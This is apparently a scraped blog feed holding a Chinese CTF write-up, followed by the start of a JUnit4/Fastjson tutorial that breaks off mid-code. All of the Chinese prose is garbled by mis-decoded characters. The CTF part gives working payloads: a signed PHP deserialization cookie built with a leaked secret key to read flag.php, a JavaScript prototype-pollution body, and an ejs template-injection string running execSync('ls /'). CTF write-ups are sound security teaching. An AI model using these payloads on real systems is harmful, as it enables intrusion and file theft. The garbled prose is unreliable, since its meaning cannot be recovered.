<h1 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h1><h2 id="Arknights"><a href="#Arknights" class="headerlink" title="Arknights"></a>Arknights</h2><p>åœ¨gitæ³„éœ² å¯ä»¥ä¸‹è½½å‡ºæºç ï¼Œ</p>
<p>å¾ˆç®€å•çš„å°±å¯ä»¥æ‰¾åˆ°ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Eeeeeeevallllllll</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $msg=<span class="string">&quot;åålikiåˆ°æ­¤ä¸€æ¸¸&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;msg;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥å°±å»æ‰¾toStringï¼Œä¹Ÿå¾ˆç®€å•ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CardsPool</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $cards;</span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">&#x27;1.txt&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file=$file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">draw</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $rand = mt_rand(<span class="number">1</span>, <span class="number">100</span>);</span><br><span class="line">        $level = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($rand &gt;= <span class="number">1</span> &amp;&amp; $rand &lt;= <span class="number">42</span>) &#123;</span><br><span class="line">            $level = <span class="number">3</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($rand &gt;= <span class="number">43</span> &amp;&amp; $rand &lt;= <span class="number">90</span>) &#123;</span><br><span class="line">            $level = <span class="number">4</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($rand &gt;= <span class="number">91</span> &amp;&amp; $rand &lt;= <span class="number">99</span>) &#123;</span><br><span class="line">            $level = <span class="number">5</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($rand == <span class="number">100</span>) &#123;</span><br><span class="line">            $level = <span class="number">6</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $rand_key = array_rand(<span class="keyword">$this</span>-&gt;cards[$level]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;stars&quot;</span> =&gt; $level,</span><br><span class="line">            <span class="string">&quot;No&quot;</span> =&gt; $rand_key,</span><br><span class="line">            <span class="string">&quot;card&quot;</span> =&gt; <span class="keyword">$this</span>-&gt;cards[$level][$rand_key]</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cards = <span class="keyword">include</span>(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±æ‰¾ä¸ªèƒ½è§¦å‘ååºåˆ—åŒ–çš„åœ°æ–¹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $sessionData;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> SECRET_KEY = <span class="string">&quot;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params">$key, $value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($key))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;sessionData[] = $value;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;sessionData[$key] = $value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAll</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;sessionData;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        $serialized = serialize(<span class="keyword">$this</span>-&gt;sessionData);</span><br><span class="line">        $sign = base64_encode(md5($serialized . <span class="built_in">self</span>::SECRET_KEY));</span><br><span class="line">        $value = base64_encode($serialized) . <span class="string">&quot;.&quot;</span> . $sign;</span><br><span class="line"></span><br><span class="line">        setcookie(<span class="string">&quot;session&quot;</span>,$value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">extract</span>(<span class="params">$session</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        $sess_array = explode(<span class="string">&quot;.&quot;</span>, $session);</span><br><span class="line">        $data = base64_decode($sess_array[<span class="number">0</span>]);</span><br><span class="line">        $sign = base64_decode($sess_array[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($sign === md5($data . <span class="built_in">self</span>::SECRET_KEY))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;sessionData = unserialize($data);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;sessionData);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Go away! You hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ­£å¥½å°±æœ‰ï¼Œåªéœ€è¦æˆ‘ä»¬çš„sessionç¬¦åˆä»–çš„è§„åˆ™å°±å¯ä»¥æ„é€ ååºåˆ—åŒ–äº†ï¼Œé‚£ä¹ˆæ„é€ Payloadï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$Eval = <span class="keyword">new</span> Eeeeeeevallllllll();</span><br><span class="line">$card = <span class="keyword">new</span> CardsPool(<span class="string">&#x27;./flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> SECRET_KEY= <span class="string">&quot;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$Eval-&gt;msg=$card;</span><br><span class="line"></span><br><span class="line">$serialized = serialize($Eval);</span><br><span class="line">$sign = base64_encode(md5($serialized . SECRET_KEY));</span><br><span class="line">$value = base64_encode($serialized) . <span class="string">&quot;.&quot;</span> . $sign;</span><br><span class="line"><span class="keyword">echo</span> $value;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å¾—åˆ°ç­”æ¡ˆ</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">TzoxNzoiRWVlZWVlZXZhbGxsbGxsbGwiOjE6e3M6MzoibXNnIjtPOjk6IkNhcmRzUG9vbCI6Mjp7czo1OiJjYXJkcyI7TjtzOjE1OiIAQ2FyZHNQb29sAGZpbGUiO3M6MTA6Ii4vZmxhZy5waHAiO319.ZjgzNzJjMDVlNTI3MGRlZTRiYjg4NDQxNWNhZGZiNDA=</span><br></pre></td></tr></table></figure>



<h2 id="Forgetful"><a href="#Forgetful" class="headerlink" title="Forgetful"></a>Forgetful</h2><p>SSTIçš„é¢˜ç›®ï¼Œå‡ ä¹æ²¡æœ‰è¿‡æ»¤ï¼Œç›´æ¥æ‹¿ä¸‹ï¼Œå‚è€ƒæˆ‘ä»¥å‰çš„æ–‡ç« payloadå¯ä»¥ç›´æ¥æ‰“é€š</p>
<h1 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h1><h2 id="æ¼«æ— æ­¢å¢ƒçš„æ˜ŸæœŸæ—¥"><a href="#æ¼«æ— æ­¢å¢ƒçš„æ˜ŸæœŸæ—¥" class="headerlink" title="æ¼«æ— æ­¢å¢ƒçš„æ˜ŸæœŸæ—¥"></a>æ¼«æ— æ­¢å¢ƒçš„æ˜ŸæœŸæ—¥</h2><p>JSåŸå‹é“¾æ±¡æŸ“+ejsçš„æ¨¡æ¿æ³¨å…¥</p>
<p>åœ¨static/<a href="http://www.zip/">www.zip</a> ä¸‹é¢å¯ä»¥æ‹¿åˆ°æºç ï¼š</p>
<p>é‡ç‚¹ä»£ç åœ¨è¿™é‡Œï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.all(<span class="string">&#x27;/wish&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.session.crying) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(<span class="string">&quot;forbidden.&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (req.method == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> wishes = req.body.wishes</span><br><span class="line">        req.session.wishes = ejs.render(<span class="string">`&lt;div class=&quot;wishes&quot;&gt;<span class="subst">$&#123;wishes&#125;</span>&lt;/div&gt;`</span>)</span><br><span class="line">        <span class="keyword">return</span> res.redirect(<span class="number">302</span>, <span class="string">&#x27;/show&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.render(<span class="string">&#x27;wish&#x27;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥é€šè¿‡æ¨¡æ¿æ³¨å…¥ï¼Œä½†æ˜¯å¿…é¡»å®Œæˆå‰ç½®æ¡ä»¶ï¼Œå¾—åˆ°session.cryingï¼Œæ‰€ä»¥å¾€å‰æ‰¾</p>
<p>ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.all(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> data = &#123; <span class="attr">name</span>: <span class="string">&quot;&quot;</span>, <span class="attr">discription</span>: <span class="string">&quot;&quot;</span> &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.ip === <span class="string">&quot;::ffff:127.0.0.1&quot;</span>) &#123;</span><br><span class="line">        data.crying = <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.method == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">Object</span>.keys(req.body).forEach(<span class="function">(<span class="params">key</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (key !== <span class="string">&quot;crying&quot;</span>) &#123;</span><br><span class="line">                data[key] = req.body[key]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        req.session.crying = data.crying</span><br><span class="line">        req.session.name = data.name</span><br><span class="line">        req.session.discription = data.discription</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res.redirect(<span class="number">302</span>, <span class="string">&#x27;/show&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.render(<span class="string">&#x27;loop&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>æ ¸å¿ƒä»£ç å°±æ˜¯åœ¨ä»–å¾ªç¯éå†è¿™ä¸€æ®µï¼Œä¼šå°†cryingè¿›è¡Œä¸€æ¬¡è®¾ç½®ï¼Œç›´æ¥åŸå‹é“¾æ±¡æŸ“ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123; <span class="string">&quot;name&quot;</span>: <span class="string">&quot;123&quot;</span>,<span class="string">&quot;discription&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;crying&quot;</span>:<span class="string">&quot;123&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å­å°±å¯ä»¥å–åˆ°sessionï¼Œejsæ¨¡æ¿æ³¨å…¥çš„éƒ¨åˆ†çœ‹å®˜æ–¹æ–‡æ¡£å³å¯ï¼š</p>
<p><img src="image-20210301121605408.png" alt="image-20210301121605408"></p>
<p>= =å‘ç°ä»–å°±ç›´æ¥æ‰§è¡Œä»£ç çš„ï¼Œé‚£ä¹ˆå¾ˆç®€å•çš„</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">wishes=&lt;%- <span class="built_in">global</span>.process.mainModule.require(<span class="string">&#x27;child_process&#x27;</span>).execSync(<span class="string">&#x27;ls /&#x27;</span>) %&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>fastJson</title>
    <url>/2020/11/02/fastJson/</url>
    <content><![CDATA[<h1 id="JUnit4"><a href="#JUnit4" class="headerlink" title="JUnit4"></a>JUnit4</h1><p>åœ¨å­¦ä¹ fastjsonä¹‹å‰ï¼Œæ„Ÿè§‰æœ‰å¿…è¦å…ˆå­¦ä¹ ä¸€ä¸‹Junit4çš„æ³¨è§£ï¼Œè‡ªä»SpringBootä¹‹åæ³¨è§£å¤§é‡çš„è¢«ä½¿ç”¨ï¼Œ</p>
<p>JUnitå‡ºç°çš„ä¸å› ä¸ºmainæ–¹æ³•æµ‹è¯•å¾ˆä¸æ–¹ä¾¿ï¼Œæ‘˜è‡ªç™¾åº¦çš„éƒ¨åˆ†ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">ç”¨mainæ–¹æ³•æµ‹è¯•çš„è¯å°±å¾ˆä¸æ–¹ä¾¿ï¼Œæƒ³æµ‹è¯•å…¨éƒ¨æ–¹æ³•çš„è¯å°±å¾—æŠŠæµ‹è¯•ä»£ç å…¨éƒ¨å†™åˆ°é‡Œï¼Œæˆ–è€…ä½ æµ‹ä¸€ä¸ªé‡å†™ä¸€æ¬¡ã€‚ä¸”æ›´é‡è¦çš„æ˜¯ï¼Œè¿™æ ·ä¼šä½¿æµ‹è¯•ä»£ç ä¸è¿è¡Œé€»è¾‘ä»£ç æ··åœ¨ä¸€èµ·ï¼Œä¸è§„èŒƒã€‚</span><br><span class="line">ä½¿ç”¨junitå°±æ–¹ä¾¿å¤šäº†,è¿™æ˜¯å•å…ƒæµ‹è¯•ï¼Œä½ æƒ³æµ‹å“ªä¸ªæ–¹æ³•å°±å†™ä¸€ä¸ªå¯¹åº”çš„æµ‹è¯•æ–¹æ³•ï¼Œç„¶åç”¨junitè¿è¡Œã€‚æ¯ä¸ªæ–¹æ³•ä¹‹é—´æ˜¯ç‹¬ç«‹çš„ï¼Œéå¸¸çµæ´»ã€‚è€Œä¸”æµ‹è¯•æ–¹æ³•ä¸€èˆ¬ä¸ä¼šç›´æ¥å†™åœ¨åŸç±»ä¸­ï¼Œè€Œæ˜¯å•ç‹¬çš„æµ‹è¯•ç±»ï¼Œè¿™æ ·æµ‹è¯•ä»£ç å°±å®Œå…¨ä¸é€»è¾‘ä»£ç åˆ†å¼€äº†ã€‚	</span><br></pre></td></tr></table></figure>

<p>è€Œåœ¨Junit4å¤§é‡ä½¿ç”¨äº†ä»Java5ä¸­å¼€å§‹ä½¿ç”¨çš„æ³¨è§£ï¼Œå¦‚ä¸‹æ˜¯JUnit4å¸¸ç”¨çš„æ³¨è§£ï¼š</p>
<h2 id="beforeï¼Œtestï¼Œafter"><a href="#beforeï¼Œtestï¼Œafter" class="headerlink" title="beforeï¼Œtestï¼Œafter"></a>beforeï¼Œtestï¼Œafter</h2><ul>
<li><p>Beforeï¼šåˆå§‹åŒ–æ–¹æ³•ï¼Œé’ˆå¯¹æ¯ä¸ªæµ‹è¯•æ–¹æ³•ï¼Œéƒ½ä¼šæ‰§è¡Œä¸€é</p>
</li>
<li><p>Test: ä»£æ›¿mainå‡½æ•°ï¼Œå¯ä»¥è®©æˆ‘ä»¬çµæ´»çš„æµ‹è¯•æŸéƒ¨åˆ†ä»£ç ,æ³¨æ„ï¼Œæµ‹è¯•çš„æ—¶å€™<strong>ä¸è¦å†™ä¸€ä¸ªTestç±»ï¼ï¼ï¼ï¼</strong>ï¼Œå¦åˆ™å› ä¸ºä¼šæœ‰é™é€‰æ‹©åŒåŒ…ä¸‹çš„testç±»ï¼Œå¯¼è‡´æŠ¥é”™,@Testæ–¹æ³•æ‰€åœ¨ç±»ä¸­,<strong>ä¸èƒ½å­˜åœ¨æœ‰å‚æ•°æ„é€ å‡½æ•°,æ— å‚æ„é€ å¯ä»¥å­˜åœ¨</strong></p>
</li>
<li><p>Afterï¼šåœ¨æ–¹æ³•ç»“æŸä¹‹åæ‰§è¡Œï¼Œæ¯æ¬¡éƒ½ä¼šæ‰§è¡Œï¼</p>
</li>
</ul>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.After;</span><br><span class="line"><span class="keyword">import</span> org.junit.Before;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æœ€å…ˆè¢«æ‰§è¡Œï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;wdnmd&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@After</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">after</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æˆ‘ä¹‹åæ‰ä¼šè¢«æ‰§è¡Œå‘¢&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é™¤æ­¤ä¹‹å¤–ï¼ŒTestæ³¨è§£è¿˜å…è®¸æˆ‘ä»¬æ·»åŠ å‚æ•°ï¼Œæ£€æµ‹æ˜¯å¦æŠ›å‡ºæŸéƒ¨åˆ†å¼‚å¸¸ï¼š</p>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="meta">@Test(expected = Exception.class)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] array = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            array[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å½“ä»£ç å‡ºç°å¼‚å¸¸çš„æ—¶å€™ï¼Œåˆ™ä¸ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œç›¸åçš„ï¼Œå¦‚æœè¿™æ®µä»£ç æ­£å¸¸æŠ›å‡ºï¼Œå°±ä¼šæŠ›å‡ºå¼‚å¸¸äº†ã€‚</p>
<h2 id="beforeclassï¼Œafterclass"><a href="#beforeclassï¼Œafterclass" class="headerlink" title="beforeclassï¼Œafterclass"></a>beforeclassï¼Œafterclass</h2><ul>
<li>BeforeClass: åœ¨æ‰€æœ‰ç±»è¢«æ‰§è¡Œä¹‹å‰æ‰§è¡Œï¼Œåªä¼šæ‰§è¡Œä¸€æ¬¡ï¼ŒåŒæ—¶å¿…é¡»ä¸ºstaticé™æ€æ–¹æ³•ï¼ˆå› ä¸ºä»–ä»¬å°±ç›¸å½“äºæ­¤ï¼‰</li>
<li>AfterClass: åœ¨æ‰€æœ‰ç±»è¢«æ‰§è¡Œä¹‹åæ‰§è¡Œ</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æˆ‘å°±ç›¸å½“äºæ„é€ å™¨ï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æˆ‘æ˜¯test1ï¼Œæˆ‘è¢«æ‰§è¡Œäº†&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@After</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">after</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æˆ‘ä¹‹åæ‰ä¼šè¢«æ‰§è¡Œ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test(expected = Exception.class)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] array = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            array[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;æˆ‘æ˜¯test2æ‰§è¡Œäº†ï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@BeforeClass</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">beforeClass</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æˆ‘åœ¨æ‰€æœ‰çš„å‰é¢è¢«æ‰§è¡Œï¼Œå¹¶ä¸”æˆ‘åªä¼šæ‰§è¡Œä¸€æ¬¡ï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@AfterClass</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">afterClass</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æˆ‘åœ¨æœ€ç»ˆæ‰€æœ‰ç»“æŸä¹‹åæ‰ä¼šè¢«æ‰§è¡Œ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Ignore"><a href="#Ignore" class="headerlink" title="Ignore"></a>Ignore</h2><ul>
<li>Ignoreå¯ä»¥è®©æˆ‘ä»¬æš‚æ—¶çš„ç¦ç”¨ç‰¹å®šçš„ç±»ï¼Œè¢«æ³¨è§£ä¹‹åçš„ç±»å°†ä¸å†è¢«æ‰§è¡Œ</li>
</ul>
<p>Ignoreç»è¿‡æˆ‘æµ‹è¯•ï¼Œåªæœ‰å½“ä»–æ”¾åœ¨æµ‹è¯•ç±»å‰æ‰å¯ä»¥ç”Ÿæ•ˆã€‚</p>
<p>ä¾‹å­ï¼š</p>
<p><img src="image-20201102165311512.png" alt="image-20201102165311512"></p>
<p>è€Œå¦‚æœæˆ‘ä»¬æ”¾åœ¨å…¶ä»–ç±»å‰é¢ï¼š</p>
<p><img src="image-20201102165351821.png" alt="image-20201102165351821"></p>
<p>æˆ‘ä»¬å¯ä»¥å‘ç°ä¾ç„¶è¢«æ‰§è¡Œäº†ï¼</p>
<h2 id="Runwith"><a href="#Runwith" class="headerlink" title="Runwith"></a>Runwith</h2><ul>
<li>Runwithæ”¾åœ¨æµ‹è¯•ç±»ä¹‹å‰ï¼Œç”¨äºç¡®å®šè¿™ä¸ªç±»è¯¥å¦‚ä½•è¿è¡Œï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä¸æ ‡æ³¨ï¼Œå°†ä¼šä½¿ç”¨é»˜è®¤çš„è¿è¡Œå®¹å™¨</li>
</ul>
<p>å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« æ¥ç†è§£ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;my.oschina.net&#x2F;itblog&#x2F;blog&#x2F;1550753?tdsourcetag&#x3D;s_pcqq_aiomsg</span><br></pre></td></tr></table></figure>



<h1 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h1><ul>
<li><p>Fastjson æ˜¯ä¸€ä¸ª Java åº“ï¼Œå¯ä»¥å°† Java å¯¹è±¡è½¬æ¢ä¸º JSON æ ¼å¼ï¼Œå½“ç„¶å®ƒä¹Ÿå¯ä»¥å°† JSON å­—ç¬¦ä¸²è½¬æ¢ä¸º Java å¯¹è±¡ã€‚</p>
</li>
<li><p>Fastjson å¯ä»¥æ“ä½œä»»ä½• Java å¯¹è±¡ï¼Œå³ä½¿æ˜¯ä¸€äº›é¢„å…ˆå­˜åœ¨çš„æ²¡æœ‰æºç çš„å¯¹è±¡ã€‚</p>
</li>
<li><p>Fastjson æºç åœ°å€ï¼š<a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></p>
</li>
<li><p>Fastjson ä¸­æ–‡ Wikiï¼š<a href="https://github.com/alibaba/fastjson/wiki/Quick-Start-CN">https://github.com/alibaba/fastjson/wiki/Quick-Start-CN</a></p>
</li>
<li><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œç¨‹åºå‘˜ä»¬ç”¨è¿™ä¸ªç¨‹åºå°±æ˜¯ä¸ºäº†ä¼ è¿JSONæ ¼å¼çš„å¯¹è±¡ï¼Œå‘ƒï¼Œæ„Ÿè§‰åƒåºåˆ—åŒ–ä¸€æ ·äº†ï¼Ÿ</p>
</li>
</ul>
<h2 id="å°†JAVAå¯¹è±¡è½¬æ¢æˆjsonæ ¼å¼"><a href="#å°†JAVAå¯¹è±¡è½¬æ¢æˆjsonæ ¼å¼" class="headerlink" title="å°†JAVAå¯¹è±¡è½¬æ¢æˆjsonæ ¼å¼"></a>å°†JAVAå¯¹è±¡è½¬æ¢æˆjsonæ ¼å¼</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> org.junit.Before;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span 